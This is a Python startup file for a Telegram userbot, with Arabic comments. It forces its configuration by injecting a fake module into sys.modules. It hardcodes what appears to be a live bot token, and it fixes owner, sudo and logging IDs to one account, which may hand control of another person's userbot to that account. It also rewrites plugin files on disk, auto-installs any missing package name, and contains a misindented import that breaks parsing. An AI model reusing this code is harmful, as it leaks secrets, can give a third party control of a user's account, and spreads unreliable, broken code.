import sys
import os
import asyncio
import logging
import types
from pathlib import Path

# ==============================================================================
# mikey: 🧠 غسيل مخ النظام (System Module Override) 🧠
# هذا الكود يشتغل قبل كل شيء ويفرض الكونفيج بالقوة الجبرية
# ==============================================================================
print("mikey: ☠️ جاري تفعيل الجوكر وغسيل ذاكرة النظام...")

# 1. البيانات الأساسية
MY_TOKEN = "8297284147:AAHDKI3ncuBhkNq6vLosVujwge5-0Jz8p1A"
MY_CHANNEL = -1003477023425
MY_ID = 7422264678

# 2. تجهيز البيئة
os.environ["TG_BOT_TOKEN"] = MY_TOKEN
os.environ["PRIVATE_GROUP_ID"] = str(MY_CHANNEL)
os.environ["BOTLOG_CHATID"] = str(MY_CHANNEL)
os.environ["TMP_DOWNLOAD_DIRECTORY"] = "./downloads/"
os.environ["SUDO_COMMAND_HAND_LER"] = r"\."

if not os.path.exists("./downloads/"):
    try: os.makedirs("./downloads/")
    except: pass

# 3. الكلاس "الجوكر" (The Joker Config)
# هذا الكلاس مستحيل يقول "Error"، أي شي تطلبه يعطيك إياه
class JokerConfig:
    # --- الثوابت ---
    TG_BOT_TOKEN = MY_TOKEN
    APP_ID = 12345678
    API_HASH = "0123456789abcdef0123456789abcdef"
    PRIVATE_GROUP_ID = MY_CHANNEL
    PRIVATE_GROUP_BOT_API_ID = MY_CHANNEL
    BOTLOG = True
    BOTLOG_CHATID = MY_CHANNEL
    PM_LOGGER_GROUP_ID = MY_CHANNEL
    BOT_USERNAME = "Reevs_Bot"
    TG_BOT_USERNAME = "Reevs_Bot"
    ALIVE_NAME = "Refz User"
    
    # --- الأوامر ---
    COMMAND_HAND_LER = r"\." 
    SUDO_COMMAND_HAND_LER = r"\."
    
    # --- الصلاحيات ---
    OWNER_ID = MY_ID
    SUDO_USERS = [MY_ID]
    
    # --- المجلدات ---
    TMP_DOWNLOAD_DIRECTORY = "./downloads/"
    TEMP_DIR = "./downloads/"
    
    # --- القوائم ---
    NO_LOAD = []
    UB_BLACK_LIST_CHAT = []
    MAX_MESSAGE_SIZE_LIMIT = 4096
    FINISHED_PROGRESS_STR = "▓"
    UNFINISHED_PROGRESS_STR = "░"

    # --- السحر: دالة __getattr__ ---
    # إذا الملحق طلب متغير مو موجود فوق، هذي الدالة تشتغل وتعطيه None
    # هذا يمنع AttributeError نهائياً
    def __getattr__(self, name):
        # print(f"mikey debug: تم طلب '{name}' وتم توفيره وهمياً.")
        if name == "SUDO_COMMAND_HAND_LER": return r"\."
        if name == "TMP_DOWNLOAD_DIRECTORY": return "./downloads/"
        return None

# 4. إنشاء موديول وهمي وحقنه في النظام
# نصنع موديول بايثون وهمي في الذاكرة
fake_module = types.ModuleType("zthon.Config")
fake_module.Config = JokerConfig() # نخليه Instance عشان getattr يشتغل صح

# نحقنه في كل اسم ممكن يطلبه السورس
sys.modules["zthon.Config"] = fake_module
sys.modules["zthon.configs"] = fake_module
sys.modules["Config"] = fake_module

# وأيضاً نحقن الكلاس نفسه كـ Type (لبعض الملحقات اللي تستخدمه كـ Static)
class StaticJoker:
    def __getattr__(cls, name):
        return None
# ننسخ القيم للكلاس الستاتيك
for k, v in JokerConfig.__dict__.items():
    if not k.startswith("__"): setattr(StaticJoker, k, v)

# تعديل الموديول ليشمل الكلاس الستاتيك أيضاً
fake_module.Config = StaticJoker 

print("mikey: ✅ تم الاستيلاء على الذاكرة (Memory Hijacked).")

# ==============================================================================
# الآن فقط نستدعي باقي مكتبات السورس (بعد ما سيطرنا على الكونفيج)
# ==============================================================================

from telethon import Button, functions, types as tele_types, utils
from ..core.logger import logging
from ..core.session import zedub
from ..helpers.utils import install_pip
from ..helpers.utils.utils import runcmd
from ..sql_helper.global_collection import (
    del_keyword_collectionlist,
    get_item_collectionlist,
)
from ..sql_helper.globals import addgvar
from .pluginmanager import load_module
from .tools import create_supergroup

ENV = bool(os.environ.get("ENV", False))
LOGS = logging.getLogger("zthon")
cmdhr = JokerConfig.COMMAND_HAND_LER 

if ENV:
    VPS_NOLOAD = ["vps"]
elif os.path.exists("config.py"):
    VPS_NOLOAD = ["heroku"]

bot = zedub
STARTUP_DONE = False

async def setup_bot():
    print(f"mikey: ✅ البوت جاهز.")
    return

async def startupmessage():
    global STARTUP_DONE
    if STARTUP_DONE: return
    try:
        if JokerConfig.BOTLOG:
            try:
                await zedub.tgbot.send_file(
                    JokerConfig.BOTLOG_CHATID,
                    "https://graph.org/file/5340a83ac9ca428089577.jpg",
                    caption=f"**•⎆┊تـم بـدء تشغـيل سـورس ريفز 🧸♥️**\n✅ تم تفعيل نظام الجوكر.",
                    buttons=[(Button.url("Source", "https://t.me/def_Zoka"),)],
                )
                STARTUP_DONE = True
            except: pass
    except: pass
    
    try:
        msg_details = list(get_item_collectionlist("restart_update"))
        if msg_details:
            msg_details = msg_details[0]
            await zedub.check_testcases()
            await zedub.edit_message(msg_details[0], msg_details[1], "**•⎆┊تـم إعـادة تشغيـل السـورس وتفعيل الأوامر ✅**")
            del_keyword_collectionlist("restart_update")
    except: pass

async def mybot(): pass
async def add_bot_to_logger_group(chat_id): pass
zthon = {"@def_Zoka", "@refz_var", "@KALAYISH", "@senzir2", "rev_fxx"}
async def saves(): pass

async def load_plugins(folder, extfolder=None):
import glob
    import os
    """
    تحميل الملحقات مع المصلح الآلي للتعليمات البرمجية
    """
    if extfolder:
        path = f"{extfolder}/*.py"
        plugin_path = extfolder
    else:
        path = f"zthon/{folder}/*.py"
        plugin_path = f"zthon/{folder}"

    files = glob.glob(path)
    files.sort()
    success = 0
    failure = []

    for name in files:
        # ======================================================
        # مصلح الملفات الفيزيائي (يعدل الكود الغلط)
        # ======================================================
        try:
            with open(name, "r", encoding='utf-8', errors='ignore') as f:
                content = f.read()
            modified = False
            
            # 1. إصلاح الفاصلة
            if "‚" in content:
                content = content.replace("‚", ",")
                modified = True
            
            # 2. إصلاح استدعاءات Config الخاطئة
            # بعض الملفات تستدعي Config بطريقة تكسر الحقن، نعدلها
            if "from ..Config import Config" in content:
                content = content.replace("from ..Config import Config", "from zthon.Config import Config")
                modified = True
            if "from zthon import Config" in content:
                content = content.replace("from zthon import Config", "from zthon.Config import Config")
                modified = True
            
            # 3. إصلاح zedub الناقص
            if "zedub" in content and "from zthon.core.session import zedub" not in content:
                content = "from zthon.core.session import zedub\n" + content
                modified = True

            if modified:
                with open(name, "w", encoding='utf-8') as f:
                    f.write(content)
                    # print(f"mikey: 🔧 تم إصلاح كود الملف {Path(name).stem}")
        except: pass
        # ======================================================

        with open(name) as f:
            path1 = Path(f.name)
            shortname = path1.stem
            pluginname = shortname.replace(".py", "")
            try:
                if (pluginname not in JokerConfig.NO_LOAD) and (pluginname not in VPS_NOLOAD):
                    flag = True
                    check = 0
                    while flag:
                        try:
                            load_module(pluginname, plugin_path=plugin_path)
                            if shortname in failure: failure.remove(shortname)
                            success += 1
                            LOGS.info(f"تـم تثبيت ملـف {shortname}")
                            break
                        except ModuleNotFoundError as e:
                            install_pip(e.name)
                            check += 1
                            if shortname not in failure: failure.append(shortname)
                            if check > 5: break
                        except AttributeError as ae:
                            # الجوكر المفروض يمنع هذا، بس لو صار:
                            LOGS.info(f"متغير ناقص في {shortname}: {ae}")
                            failure.append(shortname)
                            break
                        except Exception as e:
                            # أخطاء برمجية أخرى في الملحق
                            # LOGS.info(f"فشل {shortname}: {e}")
                            failure.append(shortname)
                            break
                else:
                    os.remove(Path(f"{plugin_path}/{shortname}.py"))
            except Exception as e:
                if shortname not in failure: failure.append(shortname)

    if extfolder:
        if not failure: failure.append("None")
        try:
            await zedub.tgbot.send_message(
                JokerConfig.BOTLOG_CHATID,
                f'Ext Plugins: `{success}`\nFailed: `{", ".join(failure)}`',
            )
        except: pass

async def verifyLoggerGroup():
    try:
        addgvar("PRIVATE_GROUP_BOT_API_ID", MY_CHANNEL)
        addgvar("PM_LOGGER_GROUP_ID", MY_CHANNEL)
    except: pass
    return

async def install_externalrepo(repo, branch, cfolder): pass